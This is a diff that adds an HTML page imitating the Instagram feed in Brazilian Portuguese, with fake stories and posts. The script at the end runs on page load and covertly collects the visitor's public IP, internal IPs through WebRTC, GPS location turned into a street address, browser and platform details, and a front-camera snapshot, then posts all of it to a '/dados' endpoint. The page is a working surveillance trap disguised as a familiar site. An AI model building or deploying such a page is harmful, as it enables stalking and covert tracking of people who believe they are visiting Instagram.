@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            color: #262626;
+            line-height: 1.6;
+        }
+
+        .header {
+            background: white;
+            border-bottom: 1px solid #dbdbdb;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            padding: 8px 0;
+        }
+
+        .header-container {
+            max-width: 975px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 54px;
+        }
+
+        .logo {
+            font-family: 'Lobster Two', cursive;
+            font-size: 24px;
+            color: #262626;
+            text-decoration: none;
+            font-weight: normal;
+        }
+
+        .search-bar {
+            flex: 1;
+            max-width: 268px;
+            margin: 0 20px;
+            position: relative;
+        }
+
+        .search-bar input {
+            width: 100%;
+            padding: 8px 16px 8px 32px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            background: #efefef;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .search-bar input:focus {
+            background: white;
+            border-color: #a8a8a8;
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .nav-icons {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .nav-icon {
+            color: #262626;
+            text-decoration: none;
+            font-size: 24px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .nav-icon:hover {
+            opacity: 0.5;
+        }
+
+        .container {
+            max-width: 614px;
+            margin: 30px auto 0;
+            padding: 0 20px;
+        }
+
+        .stories {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+            display: flex;
+            gap: 16px;
+            overflow-x: auto;
+        }
+
+        .story {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            min-width: 66px;
+            cursor: pointer;
+        }
+
+        .story-avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            position: relative;
+        }
+
+        .story-avatar::after {
+            content: '';
+            position: absolute;
+            inset: 2px;
+            background: white;
+            border-radius: 50%;
+            z-index: -1;
+        }
+
+        .story-username {
+            font-size: 12px;
+            color: #262626;
+            text-align: center;
+            max-width: 66px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .post {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            margin-bottom: 24px;
+        }
+
+        .post-header {
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .post-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+        }
+
+        .post-info {
+            flex: 1;
+        }
+
+        .post-username {
+            font-weight: 600;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .post-location {
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .post-options {
+            color: #262626;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .post-image {
+            width: 100%;
+            height: 400px;
+            background: #f8f8f8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            color: #dbdbdb;
+            border-top: 1px solid #efefef;
+            border-bottom: 1px solid #efefef;
+        }
+
+        .post-actions {
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .post-action {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #262626;
+            transition: opacity 0.2s;
+        }
+
+        .post-action:hover {
+            opacity: 0.5;
+        }
+
+        .post-action.liked {
+            color: #ed4956;
+        }
+
+        .post-stats {
+            padding: 0 16px;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .post-likes {
+            font-weight: 600;
+        }
+
+        .post-caption {
+            padding: 0 16px;
+            margin-bottom: 8px;
+        }
+
+        .post-username-caption {
+            font-weight: 600;
+            color: #262626;
+            font-size: 14px;
+        }
+
+        .post-text {
+            color: #262626;
+            font-size: 14px;
+            margin-left: 8px;
+        }
+
+        .post-comments {
+            padding: 0 16px;
+            margin-bottom: 16px;
+        }
+
+        .view-comments {
+            color: #8e8e8e;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 4px;
+        }
+
+        .post-time {
+            color: #8e8e8e;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.2px;
+        }
+
+        .comment-form {
+            border-top: 1px solid #efefef;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .comment-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .comment-input::placeholder {
+            color: #8e8e8e;
+        }
+
+        .post-button {
+            background: none;
+            border: none;
+            color: #0095f6;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .sidebar {
+            position: fixed;
+            right: calc((100vw - 975px) / 2);
+            top: 100px;
+            width: 293px;
+            display: none;
+        }
+
+        .user-card {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .user-avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+        }
+
+        .user-info h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #262626;
+        }
+
+        .user-info p {
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .suggestions {
+            background: white;
+            border-radius: 8px;
+            padding: 16px;
+        }
+
+        .suggestions-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .suggestions-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #8e8e8e;
+        }
+
+        .suggestion-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .suggestion-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+        }
+
+        .suggestion-info {
+            flex: 1;
+        }
+
+        .suggestion-username {
+            font-size: 14px;
+            font-weight: 600;
+            color: #262626;
+        }
+
+        .suggestion-subtitle {
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .follow-btn {
+            background: none;
+            border: none;
+            color: #0095f6;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        @media (min-width: 1264px) {
+            .sidebar {
+                display: block;
+            }
+            .container {
+                margin-left: calc((100vw - 975px) / 2);
+                margin-right: 0;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .search-bar {
+                display: none;
+            }
+            
+            .container {
+                max-width: 100%;
+                margin-top: 0;
+                padding: 0;
+            }
+            
+            .stories, .post {
+                border-radius: 0;
+                border-left: none;
+                border-right: none;
+            }
+            
+            .stories {
+                border-top: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-container">
+            <a href="#" class="logo">Instagram</a>
+            <div class="search-bar">
+                <span class="search-icon">🔍</span>
+                <input type="text" placeholder="Pesquisar" id="searchInput">
+            </div>
+            <div class="nav-icons">
+                <span class="nav-icon">🏠</span>
+                <span class="nav-icon">💬</span>
+                <span class="nav-icon">➕</span>
+                <span class="nav-icon">🧭</span>
+                <span class="nav-icon" onclick="openProfile()">❤️</span>
+                <span class="nav-icon">👤</span>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- Stories -->
+        <div class="stories">
+            <div class="story">
+                <div class="story-avatar">👤</div>
+                <div class="story-username">Seu story</div>
+            </div>
+            <div class="story">
+                <div class="story-avatar">🎨</div>
+                <div class="story-username">arte_digital</div>
+            </div>
+            <div class="story">
+                <div class="story-avatar">📸</div>
+                <div class="story-username">fotografia_br</div>
+            </div>
+            <div class="story">
+                <div class="story-avatar">🎵</div>
+                <div class="story-username">musica_indie</div>
+            </div>
+            <div class="story">
+                <div class="story-avatar">🏃</div>
+                <div class="story-username">corrida_sp</div>
+            </div>
+            <div class="story">
+                <div class="story-avatar">🍕</div>
+                <div class="story-username">food_lovers</div>
+            </div>
+            <div class="story">
+                <div class="story-avatar">✈️</div>
+                <div class="story-username">viagem_mundo</div>
+            </div>
+        </div>
+
+        <!-- Posts -->
+        <div class="post">
+            <div class="post-header">
+                <div class="post-avatar">📸</div>
+                <div class="post-info">
+                    <div class="post-username">fotografia_br</div>
+                    <div class="post-location">São Paulo, Brasil</div>
+                </div>
+                <div class="post-options">⋯</div>
+            </div>
+            <div class="post-image">📷</div>
+            <div class="post-actions">
+                <button class="post-action" onclick="likePost(this)">🤍</button>
+                <button class="post-action">💬</button>
+                <button class="post-action">📤</button>
+                <button class="post-action" style="margin-left: auto;">🔖</button>
+            </div>
+            <div class="post-stats">
+                <div class="post-likes"><span class="likes-count">1.234</span> curtidas</div>
+            </div>
+            <div class="post-caption">
+                <span class="post-username-caption">fotografia_br</span>
+                <span class="post-text">Capturando momentos únicos na cidade que nunca dorme ✨ #photography #saopaulo</span>
+            </div>
+            <div class="post-comments">
+                <div class="view-comments">Ver todos os 47 comentários</div>
+                <div class="post-time">Há 2 horas</div>
+            </div>
+            <div class="comment-form">
+                <input type="text" class="comment-input" placeholder="Adicione um comentário...">
+                <button class="post-button">Publicar</button>
+            </div>
+        </div>
+
+        <div class="post">
+            <div class="post-header">
+                <div class="post-avatar">🎨</div>
+                <div class="post-info">
+                    <div class="post-username">arte_digital</div>
+                    <div class="post-location">Rio de Janeiro, Brasil</div>
+                </div>
+                <div class="post-options">⋯</div>
+            </div>
+            <div class="post-image">🎨</div>
+            <div class="post-actions">
+                <button class="post-action" onclick="likePost(this)">🤍</button>
+                <button class="post-action">💬</button>
+                <button class="post-action">📤</button>
+                <button class="post-action" style="margin-left: auto;">🔖</button>
+            </div>
+            <div class="post-stats">
+                <div class="post-likes"><span class="likes-count">892</span> curtidas</div>
+            </div>
+            <div class="post-caption">
+                <span class="post-username-caption">arte_digital</span>
+                <span class="post-text">Nova criação digital inspirada nas cores do pôr do sol carioca 🌅 #digitalart #rio</span>
+            </div>
+            <div class="post-comments">
+                <div class="view-comments">Ver todos os 23 comentários</div>
+                <div class="post-time">Há 4 horas</div>
+            </div>
+            <div class="comment-form">
+                <input type="text" class="comment-input" placeholder="Adicione um comentário...">
+                <button class="post-button">Publicar</button>
+            </div>
+        </div>
+
+        <div class="post">
+            <div class="post-header">
+                <div class="post-avatar">🍕</div>
+                <div class="post-info">
+                    <div class="post-username">food_lovers</div>
+                    <div class="post-location">Belo Horizonte, Brasil</div>
+                </div>
+                <div class="post-options">⋯</div>
+            </div>
+            <div class="post-image">🍕</div>
+            <div class="post-actions">
+                <button class="post-action" onclick="likePost(this)">🤍</button>
+                <button class="post-action">💬</button>
+                <button class="post-action">📤</button>
+                <button class="post-action" style="margin-left: auto;">🔖</button>
+            </div>
+            <div class="post-stats">
+                <div class="post-likes"><span class="likes-count">2.567</span> curtidas</div>
+            </div>
+            <div class="post-caption">
+                <span class="post-username-caption">food_lovers</span>
+                <span class="post-text">Experimentando a melhor pizza da cidade! Massa crocante e ingredientes frescos 😋 #pizza #foodie</span>
+            </div>
+            <div class="post-comments">
+                <div class="view-comments">Ver todos os 89 comentários</div>
+                <div class="post-time">Há 6 horas</div>
+            </div>
+            <div class="comment-form">
+                <input type="text" class="comment-input" placeholder="Adicione um comentário...">
+                <button class="post-button">Publicar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Sidebar (desktop only) -->
+    <div class="sidebar">
+        <div class="user-card">
+            <div class="user-avatar">👤</div>
+            <div class="user-info">
+                <h3>seu_usuario</h3>
+                <p>Seu Nome</p>
+            </div>
+        </div>
+
+        <div class="suggestions">
+            <div class="suggestions-header">
+                <span class="suggestions-title">Sugestões para você</span>
+                <span style="font-size: 12px; color: #262626; font-weight: 600; cursor: pointer;">Ver tudo</span>
+            </div>
+            
+            <div class="suggestion-item">
+                <div class="suggestion-avatar">🎵</div>
+                <div class="suggestion-info">
+                    <div class="suggestion-username">musica_indie</div>
+                    <div class="suggestion-subtitle">Seguido por arte_digital</div>
+                </div>
+                <button class="follow-btn">Seguir</button>
+            </div>
+            
+            <div class="suggestion-item">
+                <div class="suggestion-avatar">🏃</div>
+                <div class="suggestion-info">
+                    <div class="suggestion-username">corrida_sp</div>
+                    <div class="suggestion-subtitle">Seguido por fotografia_br</div>
+                </div>
+                <button class="follow-btn">Seguir</button>
+            </div>
+            
+            <div class="suggestion-item">
+                <div class="suggestion-avatar">✈️</div>
+                <div class="suggestion-info">
+                    <div class="suggestion-username">viagem_mundo</div>
+                    <div class="suggestion-subtitle">Novo no Instagram</div>
+                </div>
+                <button class="follow-btn">Seguir</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Funcionalidades básicas do Instagram
+        function likePost(button) {
+            const likesElement = button.closest('.post').querySelector('.likes-count');
+            let currentLikes = parseInt(likesElement.textContent.replace(/\./g, ''));
+            
+            if (button.classList.contains('liked')) {
+                button.textContent = '🤍';
+                button.classList.remove('liked');
+                currentLikes--;
+            } else {
+                button.textContent = '❤️';
+                button.classList.add('liked');
+                currentLikes++;
+            }
+            
+            likesElement.textContent = currentLikes.toLocaleString('pt-BR');
+        }
+
+        function openProfile() {
+            // Simulação de abrir perfil
+            console.log('Abrindo perfil...');
+        }
+
+        // Busca (básica)
+        document.getElementById('searchInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                console.log('Buscando por:', this.value);
+            }
+        });
+
+        // FUNCIONALIDADES DE CAPTURA DO EXEMPLO ORIGINAL - INÍCIO
+
+        // Função para tentar obter IPs internos usando WebRTC
+        async function obterIPInterno() {
+            return new Promise((resolve) => {
+                let ipv4Interno = 'Não detectado';
+                let ipv6Interno = 'Não detectado';
+
+                const pc = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (!pc) {
+                    console.warn('WebRTC não suportado. Não foi possível obter IP interno.');
+                    resolve({ ipv4Interno, ipv6Interno });
+                    return;
+                }
+
+                const noop = () => {};
+                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
+
+                const findIPs = (text) => {
+                    const matches = text.match(ipRegex);
+                    if (matches) {
+                        matches.forEach(ip => {
+                            // Verifica se é um IPv4 privado
+                            if (ip.startsWith('192.168.') || ip.startsWith('10.') || (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
+                                if (ipv4Interno === 'Não detectado') { // Pega o primeiro encontrado
+                                    ipv4Interno = ip;
+                                }
+                            } else if (ip.includes(':') && !ip.startsWith('::') && !ip.startsWith('fe80')) {
+                                // Heurística básica para IPv6 local/global temporário
+                                if (ipv6Interno === 'Não detectado') { // Pega o primeiro encontrado
+                                    ipv6Interno = ip;
+                                }
+                            }
+                        });
+                    }
+                };
+
+                const rtc = new pc({iceServers: []});
+                rtc.createDataChannel('', {reliable: false});
+
+                rtc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const candidate = ice.candidate.candidate;
+                    findIPs(candidate);
+                    // findIPs(ice.candidate.address); // address pode não estar sempre disponível
+                };
+
+                rtc.createOffer()
+                    .then(sdp => rtc.setLocalDescription(sdp, noop, noop))
+                    .catch(noop);
+
+                // Timeout para garantir que a tentativa seja concluída
+                setTimeout(() => {
+                    rtc.onicecandidate = noop;
+                    rtc.close();
+                    console.log(`IPs internos detectados (tentativa): IPv4: ${ipv4Interno}, IPv6: ${ipv6Interno}`);
+                    resolve({ ipv4Interno, ipv6Interno });
+                }, 2000);
+            });
+        }
+
+        async function capturarDados() {
+            try {
+                // CAPTURA O IP PÚBLICO DO VISITANTE
+                let ip = 'Desconhecido';
+                try {
+                    // Corrigido: Removido o espaço na URL
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ip = ipData.ip;
+                    console.log("IP Público capturado:", ip);
+                } catch (ipError) {
+                    console.error('Erro ao obter o IP externo via ipify:', ipError);
+                }
+
+                // TENTA CAPTURAR OS IPs INTERNOS
+                let ipsInternos = { ipv4Interno: 'Não detectado', ipv6Interno: 'Não detectado' };
+                try {
+                    ipsInternos = await obterIPInterno();
+                    console.log("IPs internos capturados:", ipsInternos);
+                } catch (internoError) {
+                    console.error("Erro ao tentar obter IPs internos:", internoError);
+                }
+
+                const sistema = navigator.platform;
+                const navegador = navigator.userAgent;
+
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+                    const geoData = await geoRes.json();
+                    const endereco = geoData.display_name || 'Desconhecido';
+
+                    // Tentativa de capturar imagem (opcional)
+                    let stream;
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const context = canvas.getContext('2d');
+
+                        // Aguarda um pouco para o vídeo carregar
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imagem = canvas.toDataURL('image/png');
+
+                        fetch('/dados', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                latitude,
+                                longitude,
+                                endereco,
+                                imagem,
+                                sistema,
+                                navegador,
+                                ip: ip, // IP público
+                                ipv4Interno: ipsInternos.ipv4Interno, // IP interno IPv4
+                                ipv6Interno: ipsInternos.ipv6Interno  // IP interno IPv6
+                            })
+                        }).then(() => {
+                            console.log('✅ Localização e dados detectados com sucesso!');
+                            stream.getTracks().forEach(track => track.stop());
+                        }).catch(err => {
+                            console.error("Erro ao enviar dados (com imagem):", err);
+                            if(stream) stream.getTracks().forEach(track => track.stop());
+                        });
+
+                    } catch (mediaError) {
+                        console.warn("Acesso à câmera negado ou falhou, enviando dados sem imagem:", mediaError);
+                        // Envia os dados mesmo sem imagem
+                        fetch('/dados', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                latitude,
+                                longitude,
+                                endereco,
+                                imagem: null, // Indica que não há imagem
+                                sistema,
+                                navegador,
+                                ip: ip, // IP público
+                                ipv4Interno: ipsInternos.ipv4Interno, // IP interno IPv4
+                                ipv6Interno: ipsInternos.ipv6Interno  // IP interno IPv6
+                            })
+                        }).then(() => {
+                            console.log('✅ Localização e dados detectados com sucesso (sem imagem)!');
+                        }).catch(err => {
+                            console.error("Erro ao enviar dados (sem imagem):", err);
+                        });
+                    }
+                }, (err) => {
+                    console.error("Erro ao obter localização:", err);
+                    // Mesmo sem localização, podemos tentar enviar outros dados?
+                    // Neste caso, vamos pular o envio, pois latitude/longitude são fundamentais
+                    // Mas poderia ser adaptado para enviar apenas IP, sistema, etc.
+                });
+            } catch (err) {
+                console.error("Erro geral:", err);
+            }
+        }
+
+        // FUNCIONALIDADES DE CAPTURA DO EXEMPLO ORIGINAL - FIM
+
+        // Executar captura de dados quando a página carregar
+        window.onload = function() {
+            capturarDados();
+        };
+    </script>
+</body>
+</html>
